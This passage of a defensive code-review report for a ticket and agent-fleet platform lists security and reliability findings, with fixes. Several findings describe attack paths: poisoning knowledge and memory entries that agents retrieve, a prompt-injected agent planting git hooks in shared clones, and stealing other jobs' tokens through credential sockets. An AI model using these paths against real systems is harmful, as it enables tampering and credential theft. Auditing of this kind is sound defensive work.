- `@ProjectRoles('ADMIN','DEVELOPER','AGENT')` does not apply to agents (guard `:80`). Any rostered agent qualifies, including a TRIAGER-only one.
- Nothing records who wrote the row.

**Failure scenario:**
1. A rostered agent reads `repoId` from `POST /knowledge/search` hits (`KnowledgeHitDto.repoId`, `path`).
2. It posts `{source:'doc', sourceId:'repo:<repoId>:docs/security.md', content:'<instructions>'}`.
3. The real knowledge chunks are deleted. A `doc` row with the attacker's text replaces them.
4. The knowledge index state still says the file is indexed with an unchanged `blobSha` (`knowledge-repo-indexer.ts:116`). The next pass skips the file, so the deletion persists until the file changes upstream.

The same request with a ticket CUID replaces that ticket's KB summary, which feeds `/context` and agent retrieval. It is a cross-source integrity and prompt-injection vector.

**Fix:**
- Scope the replace to `(source, source_id)`.
- Namespace caller-supplied ids server-side, for example `doc:<sourceId>`.
- Reject any caller `sourceId` that matches a reserved prefix (`repo:`, `outcome:`, a ticket CUID that exists).
- Gate agents explicitly, for example `@ProjectPermission([CREATE,'KbDocument'])` without `exemptAgents`.
- Record an activity row.

```ts
await table.delete(`source = '${record.source}' AND source_id = '${record.source_id}'`);
```

#### SEC-2 [MEDIUM] Any project member, VIEWER included, can write memory and supersede facts another principal owns; `/extract` trusts a caller `ticketId`
**Where:**
- `memory/memory.controller.ts:31-47,49-91,122-158`
- `memory/prisma-memory-item.repository.ts:155-189`

**Code:**
```ts
// memory.controller.ts:46  (the only write gate)
await this.projectAccess.assertProjectMembership(projectId, principal); // any role incl. VIEWER
// prisma-memory-item.repository.ts:162
const existingActive = await db.memoryItem.findFirst({ where: { projectId, kind, subject, predicate, activeKey: { not: null } } });
...
if (existingActive) await db.memoryItem.update({ where: { id: existingActive.id }, data: { activeKey: null, status: 'superseded' } });
```

**Problem:**
- H12 closed the DECISION forgery. Three gaps remain:
  1. **No role gate.** VIEWER can write. The comment at `:38-45` says this is intentional, but VIEWER is the read-only role everywhere else (`koda-casl-ability.factory.ts:93`).
  2. **Supersede ignores the owner.** It is keyed on `KIND:subject:predicate`. Any writer can therefore replace a system-extracted fact, for example the FACT `ticket:<id>` / `status` written by the outbox subscriber (`extraction.service.ts:94-106`). It can also replace another user's `PREFERENCE`/`CONSTRAINT` on `subject: agent:<victim>`.
  3. **`/extract` accepts any `ticketId`** (`dto/extract-event.dto.ts:37-40`). It is never checked against `projectId`, so a caller can plant `ticket:<foreign-or-fake id>` facts.
- No activity or audit row is written. Only `ownerId` is stored.

**Failure scenario:**
1. A VIEWER posts `/memory` with `{kind:'FACT', subject:'ticket:<cuid>', predicate:'status', object:'CLOSED'}`.
2. The canonical status fact is superseded.
3. `/context` (`canonical-state.service.ts`) now shows agents a closed ticket that is actually IN_PROGRESS.

**Fix:**
- Require `ADMIN|DEVELOPER` (users) or a rostered agent with a write capability.
- Refuse to supersede a row whose `ownerId` differs from the caller unless the caller is admin; create a competing candidate instead.
- Validate `ticketId` belongs to `projectId` on `/extract`, or restrict `/extract` to internal callers only.
- Write an activity row.

#### BUG-1 [MEDIUM] Soft-deleting a project does not stop its background work: queued fleet jobs still run, its budget caps are deleted, and VCS polling continues
**Where:**
- Placement:
  - `fleet/jobs/placement.service.ts:63-103` (`placeJob`) and `:106-143` (`fillRunner`) never check `project.deletedAt`.
  - `prisma-fleet-job.repository.ts:159-164` (`findQueuedIds`, no project filter).
  - The dashboard already knows these jobs are in the window: `dashboard/domain/dashboard.domain.ts:18` says "soft-deleted included".
- Budgets:
  - `prisma-budget.repository.ts:97` treats a soft-deleted project as "scope gone".
  - `budget-sweeper.ts:60-62` then deletes its policies and closes their approvals.
- VCS:
  - `prisma-vcs.repository.ts:97-103,113-119` (no `deletedAt` filter).
  - `vcs-polling.service.ts:110-117` keeps polling.
- Ticket side: `projects/projects.service.ts:224-235` only sets `deletedAt`.

**Code:**
```ts
// prisma-budget.repository.ts:97
case 'project': return (await this.db.project.count({ where: { id, deletedAt: null } })) > 0;
```

**Failure scenario:**
1. A project has 5 QUEUED nax RUN jobs and a paused $50 project budget.
2. An admin soft-deletes the project.
3. Within 60 s the budget sweeper deletes the project policy as an orphan, which lifts the pause.
4. The next runner sync's `fillRunner` assigns the queued jobs. They spend real LLM budget and may push branches or PRs for a deleted project.
5. Users can no longer cancel the jobs: every project route 404s because `findProjectIdBySlug` rejects deleted projects.
6. The polling connection keeps importing GitHub issues into the deleted project forever.

**Fix:**
- On soft-delete, run one transaction that:
  - cancels QUEUED and ASSIGNED-unacked jobs,
  - requests a CANCEL for held jobs,
  - disables schedules,
  - sets `vcsConnection.isActive=false`.
- Add `project: { deletedAt: null }` to `findQueuedIds` and to `placeJob` / `fillRunner`.
- Keep budget policies of soft-deleted projects, or at least keep enforcing their pause until a hard delete.

#### BUG-2 [MEDIUM] Head-of-line starvation: `fillRunner` only scans the 50 globally oldest QUEUED jobs, and unplaceable jobs never leave QUEUED
**Where:**
- `fleet/jobs/placement-rules.ts:164`
- `placement.service.ts:118,156`
- `prisma-fleet-job.repository.ts:159-164`

**Code:**
```ts
export const QUEUED_SCAN_LIMIT = 50;
for (const id of slots > 0 ? await this.repo.findQueuedIds(QUEUED_SCAN_LIMIT) : []) {
  ...
  if (job.pinnedRunnerId && job.pinnedRunnerId !== runner.id) continue;
```

**Problem:**
- `placeJob` runs once, at dispatch or requeue. After that, the only placement path is `fillRunner` / `fillRunnerThreads` on runner sync (`sync/sync.service.ts:93-94`).
- Both scan the same 50 oldest QUEUED rows across all projects, thread and RUN mixed.
- Nothing times out or cancels a QUEUED job with a permanent misfit (the dashboard only labels it `never`, `attention-unplaceable.ts:48`). Such jobs occupy the window forever. So do jobs pinned to an offline runner, jobs whose labels no runner has, THREAD jobs when no runner has thread capacity, and the deleted-project jobs from BUG-1.

**Failure scenario:**
1. 50 THREAD jobs (or 50 jobs pinned to a decommissioned runner) sit QUEUED.
2. A new RUN job is dispatched while every runner is busy, so `placeJob` finds no fit.
3. When runners free up, `fillRunner` only looks at the 50 older blocked jobs and skips them all.
4. The new job is never assigned, and nothing alerts beyond a dashboard warning.

**Fix:**
- Filter the scan by what the runner can take: exclude other runners' pins and the wrong kind, and push label matching into SQL.
- Alternatively, page through QUEUED with a cursor until the slots fill.
- Expire or cancel QUEUED jobs whose verdict is permanent after N minutes.

#### BUG-3 [MEDIUM] VCS issue import is check-then-insert with no unique key, and overlapping callers create duplicate tickets
**Where:**
- `vcs/vcs-sync.service.ts:37-50`
- `prisma-vcs.repository.ts:174-207`
- `prisma/schema.prisma:276`: `@@index([externalVcsId])` is not unique.
- Overlapping callers:
  - `vcs-polling.service.ts:78-80`: `setInterval` with no in-flight guard; an interval is ≥ 60 s, but one poll can be 10 pages plus N creates plus a PR sync.
  - `vcs.controller.ts` `POST /sync` and `/sync/:n`.
  - The webhook `issues.opened`.

**Code:**
```ts
const existingTicket = await this.vcsRepo.findExistingTicketByExternalId(project.id, externalVcsId);
if (existingTicket) return { action: 'skipped', ... };
const result = await this.vcsRepo.createTicketFromIssue(project, issue, externalVcsId);
```

**Failure scenario:**
1. An admin clicks "Sync now" (`POST /projects/x/vcs/sync`) while the polling tick is importing the same page.
2. Both read "no ticket" and both insert.
3. GitHub issue #42 becomes two koda tickets, `X-17` and `X-18`.
4. Later PR and commit linking attaches to whichever ticket `findFirst` returns.

**Fix:**
- Add `@@unique([projectId, externalVcsId])` and a migration that dedups existing rows.
- Map P2002 to `skipped`.
- Add a per-connection `running` flag in `VcsPollingService.tick`.

#### BUG-4 [MEDIUM] Entity-graph `assigned` handler reads keys the producer never sends, so owner links are never created
**Where:**
- Consumer: `entity-graph/entity-graph.service.ts:223-279`
- Producer: `tickets/tickets.service.ts:410-414`

**Code:**
```ts
// consumer :241
const assignedToUserId = event.data?.assignedToUserId as string | undefined;
const assignedToAgentId = event.data?.assignedToAgentId as string | undefined;
// producer
{ assignedTo: assignInput.userId ?? assignInput.agentId ?? null, assigneeType: 'user'|'agent'|null }
```

**Problem:** This is the H13 failure mode again ("unit tests mock the boundary"). `entity-graph.service.spec.ts:68,86` feeds `{assignedToUserId}`, a shape no producer emits. Every real `assigned` event creates the ticket node and then exits with no `TICKET_TO_OWNER` link.

**Failure scenario:** Owner-based graph queries and entity ranking never see any assignment.

**Fix:**
- Read `data.assignedTo` together with `data.assigneeType`.
- Add an integration test that drives `TicketsService.assign` through the outbox into `EntityGraphService`.

#### BUG-5 [MEDIUM] LanceDB `optimize()` runs outside the per-table write mutex and races `add`/`delete` from the knowledge indexer and KB writes
**Where:**
- `rag/vector-store.service.ts:233-237`
- `strategies/counter-optimize.strategy.ts:26`
- `strategies/cron-optimize.strategy.ts:45`
- `strategies/optimize-in-background.ts:13`

**Code:**
```ts
await this.lanceTable.addRecord(tableName, table, record);          // inside exclusive()
if (this.lanceTable.available && this.optimizeStrategy) {
  await this.optimizeStrategy.onInsert(projectId, table);            // optimize() OUTSIDE exclusive()
}
```

**Problem:**
- `LanceTableManager.exclusive` says add, delete and optimize must be serialised per table (`lance-table-manager.ts:413-418`). LanceDB has no writer mutex.
- `VectorStore.optimizeTable` honours this (`:531`). The three strategy paths do not: the counter on insert, the cron interval, and the first-access fire-and-forget.
- The table they optimize is the same `project_<id>` table that `KnowledgeChunkStore.replaceFile` deletes from and adds to under `exclusive` (`knowledge-chunk-store.ts:82,90`).

**Failure scenario:**
1. During a knowledge pass, a KB insert reaches the counter threshold.
2. `optimize()` compacts while `replaceFile` deletes and then adds a file's chunks.
3. One side fails with a commit conflict. If it is the replace, the pass fails or the file's rows are left half-replaced; the optimize error is only logged.

**Fix:** Route every strategy optimize through `manager.exclusive(tableName, () => table.optimize())`. Pass the manager, or a bound `optimize(projectId)` callback, into the strategies instead of the raw table.

#### BUG-6 [MEDIUM] The merged-PR auto-transition bypasses the ticket state machine: unconditional write, stale precheck, soft-deleted tickets, no event/webhook/live, null actor
**Where:**
- `vcs/prisma-vcs.repository.ts:304-338`
- `vcs-pr-sync.service.ts:165-202`
- Webhook lookup without a `deletedAt` filter: `prisma-vcs.repository.ts:260`

**Code:**
```ts
await this.db.ticket.update({ where: { id: input.ticketId }, data: { status: TicketStatus.VERIFY_FIX } });
...
await this.db.ticketActivity.create({ data: { ..., actorUserId: null, actorAgentId: null } });
```

**Problem:**
1. The IN_PROGRESS check reads `link.ticket.status` loaded before the PR API call (`:170`). The update has no `status: IN_PROGRESS` predicate, so a ticket closed or rejected meanwhile is forced back to VERIFY_FIX.
2. The webhook path (`findTicketLinkForConnectionPr`, `:260`) does not filter `ticket.deletedAt`, so a merge transitions a soft-deleted ticket.
3. Unlike every other transition (`ticket-transitions.service.ts:87-160`), it writes no `status_changed` TicketEvent or outbox row, no `STATUS_CHANGE` webhook and no live event. Memory, entity-graph, notifications and project webhooks never learn about it.
4. The actor is null, with no SYSTEM marker and no approvalMode.
5. `prState` is committed before the transition. A transient DB error in the transition is only logged (`:189-201`), and the link is no longer refreshable, so it is never retried. The H6 note about this still applies to non-FK failures.

**Fix:**
- Call a `TicketTransitionsService` system-actor method inside one transaction with the `prState` write.
- Use `updateMany({ where: { id, status: 'IN_PROGRESS', deletedAt: null } })` and branch on the count.
- Emit the same event, webhook and live triplet as other transitions, with `actorType: 'SYSTEM'`.

#### ENH-1 [MEDIUM] Agent-first audit: no write path in this area records `approvalMode`/`approver`; many record no actor at all; several misattribute
**Where:** `approvalMode` exists only on `PendingAction` (`prisma/schema.prisma:1138`, `fleet/assistant/actions/*`). `FleetActivity` has no `approvalMode`/`approver` column (`schema.prisma:866`; `activity/domain/fleet-activity.domain.ts:9-19`).

**Write paths with no audit row at all:**
- Knowledge: `PUT /knowledge/patterns`, `POST /knowledge/repos/:id/reindex` (`project-knowledge.controller.ts:108-153`).
- KB: add, delete, graphify import and optimize (`rag.controller.ts`).
- Memory: create, decision and extract (`memory.controller.ts`).
- Skills:
  - Catalog create, update and delete (`skills.service.ts:19-95`).
  - Project enable and disable (`project-skills.controller.ts:38-70`).
- VCS: connection create, update, delete, test, rotate and sync (`vcs.controller.ts`, `vcs-connection.service.ts`).
- VCS issue import: the ticket is created with no TicketEvent and no actor (`prisma-vcs.repository.ts:174-207`).
- Code-intel index (`code-intel.controller.ts:57-78`).
- Fleet ticket unlink only writes a TicketEvent.

**Misattribution:**
- Scheduled dispatches are recorded as `actorType:'USER', actorId: <schedule owner>`, action `job.dispatched` (`fleet-jobs.service.ts:99-100`, called from `schedule-ticker.ts:137`). The user did not act; the ticker did. The `scheduleId` is buried in the payload.
- When a project ADMIN edits another user's schedule (`schedules.service.ts:100-125`), later fires still run and are recorded as the original owner.
- Fleet failure comments and PR-link events are attributed to the job requester as a `user` (`fleet-ticket-event.recorder.ts:19`; `fleet-job-ticket.effects.ts:87,99`), but the system wrote them.
- The merged-PR transition has a null actor (BUG-6).

**Fix:**
- Add `approvalMode` (`none|self|agent|human`) and `approverId` to `FleetActivity` and `TicketEvent`.
- Introduce one `AuditActor` value (`{type, id, onBehalfOf?, approvalMode, approverId?}`) and pass it through every service write above.
- Record scheduled and system actions as `SYSTEM` with `responsibleUserId` = owner.

---

### LOW

#### BUG-7 [LOW] Out-of-order `code_commit` events roll symbols back to older content
- **Where:** `code-intel/code-commit-outbox-handler.ts:84`, `ast-index.service.ts:89-125`, `prisma-code-intel.repository.ts:88-104`.
- **Problem:** The upsert overwrites `commitHash` and content unconditionally.
- **Scenario:** An older commit's event fails and is retried by the outbox backoff after a newer commit has been indexed. It re-indexes the file with the old content.
- **Fix:** Store the commit timestamp or a per-repo sequence. Skip the write when the stored row is newer.

#### BUG-8 [LOW] A crash between `claimFire` and dispatch loses the fire
- **Where:** `fleet/schedules/schedule-ticker.ts:103-104`.
- **Problem:** `nextFireAt` is advanced before the job exists, so delivery is at-most-once. This is acceptable but undocumented.
- **Fix:** Document the behaviour, or claim and create the job in one transaction (dispatch already runs a transaction).

#### BUG-9 [LOW] A requeued scheduled job's attempt is never counted against the schedule
- **Where:** `schedule-progress.service.ts:24-25`; requeue extras at `fleet-jobs.service.ts:262-270` do not reset `scheduleCountedAt`.
- **Scenario:** The first attempt fails and is counted. The requeued attempt passes 3 stories, but `onJobEnded` returns early on the old `scheduleCountedAt`. Progress is lost and `noProgressTicks` stays raised.
- **Fix:** Add `scheduleCountedAt: null` to the requeue patch.

#### PERF-1 [LOW] The fleet PR refresher starves links beyond the first 500
- **Where:** `fleet/tickets/fleet-pr-state.refresher.ts:69`, `prisma-fleet-tickets.repository.ts:194`.
- **Problem:** Results are ordered by `prUpdatedAt asc`, but an unchanged link never bumps `prUpdatedAt` (`apply` returns early at `:130`). Links in repos that fail to read are also never bumped.
- **Scenario:** With more than 500 open fleet PR links, the same 500 are rechecked every pass. Merges on the rest are never detected, so no VERIFY_FIX and no knowledge-merge hook.
- **Fix:** Add a `prCheckedAt` column, update it on every check, and order by it.

#### PERF-2 [LOW] AST indexing is O(S² · k) and runs one interactive transaction over all upserts
- **Where:** `code-intel/ast-index.service.ts:111-118` runs `.find` over all symbols for every caller and callee. `:89-125` does one upsert per symbol inside a transaction with Prisma's default 5 s timeout.
- **Problem:** A large commit, up to the 1 MiB body or a big `code_commit`, can exceed 5 s and roll back the whole index. The outbox then retries forever.
- **Fix:**
  - Build a `Map<symbolId, file>` once.
  - Use `createMany` / `deleteMany` in batches.
  - Raise the timeout explicitly.
  - Add `@ArrayMaxSize` and a content `MaxLength` to `IndexCommitDto` (`dto/index-commit.dto.ts:27-30`).

#### PERF-3 [LOW] Remaining unbounded reads
- `timeline.service.ts:131-132`: `getTicketHistory` loads every event of a ticket. It has no callers; delete it or page it.
- `prisma-canonical-state.repository.ts:134-147`: `findActiveDecisions` returns every active DECISION in the project on every `/context` call. Any member can grow this set (one row per distinct topic). Add `take` and an order.

#### PERF-4 [LOW] `vectorRows.find` inside the candidate loop
- **Where:** `rag/hybrid-retriever.service.ts:274` duplicates `simMap`, which is already built at `:248-252`. It is O(n·m).
- **Fix:** Use `simMap.get(id)`.

#### MEM-1 [LOW] `EntityStore` is an unbounded in-process map and re-indexes deleted tickets
- **Where:** `rag/entity-store.ts:24-38,169-181`; `prisma-rag.repository.ts:184-189` (`findTicketById` has no `deletedAt` filter).
- **Problem:** Every `ticket_event`, including `TICKET_DELETED`, triggers a DB read and `indexEntity`. Deleted tickets are never removed, and the map grows for the life of the process.
- **Fix:**
  - Filter `deletedAt`.
  - Handle `TICKET_DELETED` by removing the entity.
  - Bound the map, or rebuild it lazily from the DB.

#### MEM-2 [LOW] The embedding timeout does not cancel the request
- **Where:** `fleet/knowledge/knowledge-repo-indexer.ts` `limited()`.
- **Problem:** `Promise.race` leaves the provider call running after the 60 s timeout. Under a slow Ollama, orphaned requests pile up across batches and passes.
- **Fix:** Pass an `AbortSignal` into `EmbeddingService.embed` / `embedBatch`.

#### SEC-3 [LOW] The VCS webhook HMAC secret is stored in plaintext while the token is encrypted
- **Where:** `vcs/vcs-connection.service.ts:77-88,205-206`.
- **Risk:** Anyone who can read the database can forge GitHub deliveries.
- **Fix:** Encrypt it with the same `encryptToken` / `VCS_ENCRYPTION_KEY`.

#### SEC-4 [LOW] The `allowedAuthors` filter fails open
- **Where:** `vcs/vcs-sync.service.ts:63-76`.
- **Problem:** A malformed stored JSON value imports every author's issues. Values are written server-side, so this needs DB tampering.
- **Fix:** Fail closed and log the error.

#### ENH-2 [LOW] Any project member can trigger the retrieval evaluation harness
- **Where:** `retrieval/retrieval.controller.ts:24-39`.
- **Problem:** VIEWERs and rostered agents can run N embedding searches per call, with no throttle beyond the default.
- **Fix:** Add `@ProjectRoles('ADMIN')` or move the route behind an admin path.

#### STYLE-1 [LOW] Files over the 400-line guideline
- `vcs/vcs-webhook.service.ts` (702)
- `rag/vector-store.service.ts` (555)
- `entity-graph/entity-graph.service.ts` (514)
- `rag/lance-table-manager.ts` (490)
- `fleet/knowledge/markdown-chunker.ts` (480)

`vcs-webhook.service.ts` has one handler per PR action and would split cleanly.

---

### Verified non-issues (checked, no finding)

- **Log storage:**
  - Log keys are built server-side from regex-validated parts.
  - `LocalDiskLogStore.pathFor` checks `resolve` + `startsWith(root+sep)` (`local-disk-log.store.ts:24-29`).
  - Raw reads are capped at 1 MiB; entry scans are bounded by `logScanBytes`.
  - Uploads are runner-key only, fenced by `leaseEpoch`, size-capped and SHA-checked.
- **Knowledge filters:**
  - LanceDB filters only use `isSafeFilterValue`-guarded ids.
  - `pathPrefix` is filtered in JS.
  - Pattern matching is memoised, which addresses ReDoS-style blowup (`knowledge-patterns.ts:55-74`).
- **Code-intel:** no shell or `child_process` use anywhere, so there is no command injection.
- **Skills:**
  - The GitHub URL is strictly parsed (`skills/github-url.ts`).
  - Path segments are `encodeURIComponent`-ed.
  - Size is checked from the tree before any fetch.
- **Fleet jobs:**
  - Every read is project-scoped (`findInProject`, `job.projectId !== projectId`).
  - Agents and runners are refused on job, log, analytics and dashboard routes.
  - Cancel and requeue lock the row and check the state table.
- **Budget gate:** dispatch, requeue and placement all re-check the pause. A job inserted after a hard stop is cancelled at placement (`placement.service.ts:71-76`), so the dispatch-time race does not bypass enforcement.
- **Schedules:**
  - The `ticking` flag prevents overlapping ticks; `claimFire` CAS prevents double fire.
  - The cron is normalised to five fields.
  - Timezones are canonical IANA names (fixed offsets are refused).
  - The 15-minute gap walk is bounded (100 fires, 2-year horizon).
- **Test hooks:** `fleet/test-hooks` is off whenever `NODE_ENV=production` (`fleet.config.ts:150`).
- **Webhook:**
  - The signature check is timing-safe.
  - Unknown slug, missing secret and bad signature all return the same 401.
  - The replay guard runs before handling.
  - Inactive and non-webhook connections return 200 with `ignored`.

---

### Rubric (0-20 each)

| Dimension | Score | Rationale |
|:--|:--|:--|
| Security | 14 | Authz is consistent and fails closed; there are no injection or traversal paths. Points lost for the shared-key overwrite classes (SEC-1, SEC-2) and for the agent bypass of `@ProjectRoles` on KB writes. |
| Reliability | 13 | Locking and CAS discipline in fleet jobs, schedules and budgets is strong. Points lost for soft-delete leakage (BUG-1), placement starvation (BUG-2), the import race (BUG-3), the LanceDB optimize race (BUG-5) and the non-atomic merged transition (BUG-6). |
| API Design | 15 | Responses are enveloped consistently and DTOs are well bounded. Weak spots: the `/memory/extract` and `/kb/documents` contracts trust caller identifiers; `IndexCommitDto` is unbounded. |
| Code Quality | 15 | Small focused files with design references. Points lost for five files over 400 lines, the dead `incident_linked` / `getTicketHistory` paths, and a unit test that fixes the wrong contract (BUG-4). |
| Best Practices | 12 | The agent-first audit requirement (actor + approvalMode + approver) is not met by any write path in this area (ENH-1). Contract tests between outbox producers and consumers are still missing. |
| **Total** | **69 / 100** | |

---

## Review D: apps/runner/src, packages/fleet-protocol, apps/cli/src

HEAD `44269581` (main). Read-only review. The test suite was not run.
Checklists used: universal.md, node-general.md.

### Summary

| Severity | Count |
|:--|:--|
| CRITICAL | 0 |
| HIGH | 0 |
| MEDIUM | 5 |
| LOW | 13 |

Overall the runner is unusually defensive. It validates every ASSIGN field again (D30) and runs safe-segment checks on every path. Tokens are memory-only and reach git and gh/glab only through per-epoch unix sockets in a 0700 directory. The journal uses WAL with `synchronous=FULL` and transactional event appends. Identity, job-profile and nax-profile writes are atomic (temp file + rename). Every subprocess call has a timeout and a cap on its output. Log windows are bounded and snapshots are fitted to 16 KiB. The service unit/plist inputs are allowlisted rather than escaped.

The CLI's prior HIGH (H10) is fixed. The remaining findings are mostly about how the sync loop and supervision fail, plus defense-in-depth gaps.

#### Rubric (0-20)

| Dimension | Score | Note |
|:--|:--|:--|
| Security | 16 | Strong input re-validation, no shell, socket dir checks. Gaps: runner git does not harden repo-local config/hooks; per-job sockets are guarded only by the uid. |
| Reliability | 15 | Journal and ack design are solid. Gaps: a persistent 400 makes the sync loop hot-loop; one unhandled rejection path; liveness after readopt relies only on `kill(pid,0)`. |
| API Design | 16 | One wire-type package, imported type-only by the API. One dead field (`nextPollAfterMs`) and a stale comment. |
| Code Quality | 15 | Small focused modules. `thread-job-run.ts` is 1045 lines, over the 800 cap. |
| Best Practices | 16 | Deliberate D-numbered design notes and a redacting logger. A few argv-secret leftovers in the CLI and enroll. |

---

### Prior-finding status (docs/20260925-review-whole-repo.md)

| ID | Status at HEAD | Evidence |
|:--|:--|:--|
| H10 (CLI sends global key to repo-controlled URL) | **FIXED** | `apps/cli/src/config.ts:144-152`: `apiUrl`/`apiKey` in `.koda/config.json` are ignored, with a warning. `:157-170`: precedence is flags -> env -> profile -> global. `:227-232`: the walk-up stops at the home directory. Tests: `config.spec.ts:240,267,457,473,482,493`. Fix commit: `ba5e90d7`. Residual: a repo can still pick one of the user's own `profile`s (`config.ts:154-155`). LOW, see SEC-9. |
| M26 (assignee always "Unassigned") | FIXED | API `TicketResponseDto.assignee` (`ticket-response.dto.spec.ts:55`); the CLI reads `t.assignee?.name` (`ticket.ts:184,224,262`). |
| M27 (`ticket mine` sends literal `self`) | FIXED | The API resolves `self` at `tickets.controller.ts:46`; the CLI sends `assignedTo: 'self'` (`ticket.ts:211`). |
| M28 (`verify-fix --pass` cannot send approve) | FIXED | `@ApiQuery approve` at `tickets.controller.ts:321`; the CLI passes `query: { approve: Boolean(options.pass) }` (`ticket.ts:471`). |
| LOW: global conf mistaken for project config | FIXED | `config.ts:227-232` (homedir ceiling). |
| LOW: empty-string `apiUrl` fallbacks use `??` | PARTIAL | `apiUrl` now uses `\|\|` (`config.ts:158-163`). `apiKey` still uses `??` (`:165-170`), so `KODA_API_KEY=""` blocks the fallback to the profile and global key. See STYLE-2. |
| LOW: secrets as argv | PARTIAL | `--api-key` and `--token` now go through `resolveSecret` (stdin, prompt or env; `utils/secret-input.ts`). Still on argv: `auth register --password` (`commands/auth.ts:50`), `user create --password` (`commands/user.ts:64`), `webhook --secret` (`commands/webhook.ts:21`). See SEC-8. |
| LOW: Ctrl+C exits 0 | FIXED | `utils/signals.ts` exits 130 or 143. |
| LOW: missing `--force` exit-code mismatch | FIXED | `utils/force.ts` always exits 1. |
| LOW: auth hint invalid syntax | FIXED but poor | `utils/error.ts:122` now prints valid `koda config set --api-key <key>`, but that is the argv form the CLI warns against. See STYLE-2. |
| LOW: numeric options send NaN | FIXED | `parse-positive-int.ts`, `fleet-*` parsers, `memory.ts:127-130`. |

---

### MEDIUM

#### BUG-1 [MEDIUM]: A persistent 400 turns the sync loop into a zero-delay hot loop and drops one valid event per job
- **File:** `apps/runner/src/sync/sync-loop.ts:182-207` (badBatch), `:111-112` (run)
- **Code:**
  ```ts
  if (outcome.kind === 'retry') await this.deps.sleep(outcome.delayMs);
  else if (outcome.kind !== 'again' && !this.dirty) await this.deps.sleep(...);   // 'again' never sleeps
  ...
  this.deps.journal.replaceEvent(job.jobId, job.leaseEpoch, event.seq, 'lifecycle', { level: 'error', message });
  this.scale = FULL_SCALE;
  return { kind: 'again' };
  ```
- **Failure scenario:**
  1. Every sync returns 400 for a reason that is not an event. Examples: an API deploy with a parser regression, a WAF or proxy that rejects the body, or a header-level field such as `tokenRequests`, which halving never shrinks.
  2. The loop halves the batch about 9 times, then excludes acks, then rewrites `jobs[0].events[0]` into a "dropped" lifecycle event. That event may be a real `state` transition.
  3. It resets to FULL scale and starts again with no sleep at any point.
  4. After the first replacement, `events[0]` is the already-replaced row, so the runner loops forever. It fires about 10 requests per cycle as fast as the server answers 400 (self-DoS against the API).
  5. If that first event was `RUNNING -> UPLOADING` or a terminal state, the transition is lost permanently. The server then holds the job in a non-terminal state until its sweeper runs.
  6. `acksExcluded` stays true until a success, so command acks are held back as well.
- **Fix:**
  - Count consecutive bad-batch cycles. After replacing an event, return `retry` with `backoffDelay(...)` instead of `again`.
  - Only replace an event if dropping it actually lets the request through: probe with `jobs: []` once at minimum scale. If the bare head still 400s, the event is not the poison, so back off and keep it.
  - Never replace a `state` event without logging loudly. Consider parking it instead.

#### SEC-1 [MEDIUM]: The runner's own git calls in the shared clone honor repo-local hooks and config (inconsistent hardening)
- **Files:** `apps/runner/src/executor/git.ts:82-91` (`createGit` adds only credential-helper `-c` args). Call sites in agent-written clones: `executor/workspace.ts:43-64` (fetch/reset/clean), `executor/checkout.ts:39,52` (checkout fires `post-checkout`), `executor/plan-commit.ts:82-103` and `executor/progress-push.ts:36-56` (`add`/`commit`/`push`; `--no-verify` does not skip `post-commit`, `reference-transaction` or `pre-push`), `thread/thread-worktree.ts:152-154` (`worktree add`, `checkout`).
- **Contrast:** the runner already hardens two other paths: `thread/project-code/mirror-store.ts:114` (`-c core.hooksPath=/dev/null -c gc.auto=0 -c protocol.file.allow=...`) and `thread/skill-fetch.ts:118`. nax hardens its own unsandboxed git the same way (`nax-agent/dist/internal/git-env.js`: `core.fsmonitor=false`, `diff.ignoreSubmodules=dirty`, `submodule.recurse=false`).
- **Failure scenario:** a prompt-injected agent in a job whose profile runs unsandboxed, or with `bashMode: raw`, writes `.git/hooks/post-checkout` or `core.fsmonitor=<cmd>` into the repo clone. The clone is reused across jobs: `ensureClone` only runs `remote set-url`. From then on, every runner-side git call on that repo runs the payload inside the daemon process, for every future job on that repo. That includes jobs dispatched by other projects or users of the server.
  - nax's sandbox denies writes to `<gitdir>/hooks` and `<gitdir>/config` (`nax-agent/dist/sandbox/policy-builder.js:33-38`), so this needs an unsandboxed or raw job. That is why this is MEDIUM rather than HIGH. The runner relies entirely on nax's sandbox being on and complete.
- **Fix:** give `createGit` a fixed hardening prefix for every call:
  ```ts
  ['-c','core.hooksPath=/dev/null','-c','core.fsmonitor=false','-c','diff.ignoreSubmodules=dirty','-c','submodule.recurse=false','-c','protocol.file.allow=never']
  ```
  Alternatively pass `GIT_CONFIG_COUNT/KEY/VALUE` as nax does. Also add `--no-verify` to `push`. At prepare, consider deleting `.git/hooks/*` and rejecting `include.*`, `includeIf.*`, `filter.*` and `core.*` command keys in `.git/config`.

#### SEC-2 [MEDIUM]: Per-job credential sockets are guarded only by the uid, so any job's agent can mint other concurrent jobs' git tokens
- **Files:** `apps/runner/src/credentials/socket-dir.ts:21-24,30-46`, `credentials/cred-server.ts:14-39`, `credentials/broker.ts:174-189`
- **Code:** the socket name is `sha256(runnerId:jobId:epoch)[0..16].sock` in a 0700 directory owned by the runner uid. The server answers any `get\n` with no per-job secret and no peer check.
- **Failure scenario:**
  1. Jobs A (repo X) and B (repo Y, possibly another project) run at the same time on one runner, as the same OS user.
  2. A's agent (raw or unsandboxed) runs `ls /tmp/koda-runner-$UID`, connects to every `*.sock`, and sends `get`.
  3. It receives B's installation token, which is push-capable for repo Y.
  - D88 keeps tokens out of nax's environment, but that only holds inside one job. It is not a boundary between jobs.
- **Fix:** this is architectural. Options:
  - Give each job a random 32-byte nonce. Embed it in that job's helper and shim argv, and require `get <nonce>\n`. This is still readable via `ps`/`/proc` by the same uid, so it only raises the bar.
  - Run each job under its own OS user, or check `SO_PEERCRED` (Linux) / `LOCAL_PEERPID` (macOS) against the job's process group.
  - At minimum, document that a runner must not host mutually untrusted projects concurrently, or default `capacity` to 1 per trust domain.

#### BUG-2 [MEDIUM]: Watch-loop liveness after readopt is `kill(pid,0)` only; a recycled pid (or an EPERM) keeps the job RUNNING and the repo mutex held
- **Files:** `apps/runner/src/supervisor/job-run.ts:397-405`, `executor/nax-process.ts:44-52`
- **Code:**
  ```ts
  if (row.pid === null || !this.deps.executor.isAlive(row.pid)) break;   // isAlive: EPERM counts as alive
  ```
- **Failure scenario:**
  1. After a daemon restart, readopt resumes `watch` (`supervisor.ts:190-192`). nax is no longer the daemon's child, so its pid is reaped by init.
  2. When nax exits, the pid can be reused before the next 2 s tick. macOS pid space is 99,999.
  3. If the new process belongs to anyone (EPERM is treated as alive), the loop never breaks. The job stays RUNNING forever and holds the per-repo mutex (`run()` -> `mutex.acquire`), so every later job on that repo queues behind it.
  4. No heartbeat or staleness check runs during `watch`. `fresh()` is consulted only once, at readopt.
